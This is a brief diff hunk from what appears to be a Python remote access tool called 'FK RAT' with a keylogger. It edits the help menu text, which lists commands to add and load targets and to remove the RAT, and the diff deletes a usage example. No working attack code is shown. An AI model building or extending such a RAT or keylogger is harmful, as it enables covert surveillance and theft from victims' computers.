@@ -30,9 +30,6 @@ help_menu = """
             new     Adds a new target to the RAT
             load    Loads a target file
             remove  Remove FK RAT on your Computer
-
-        Example:
-            python3 keylogger.py -f sunnickel.fkrat
 """
 option_menu = """
         [*] Select a number to use a payload
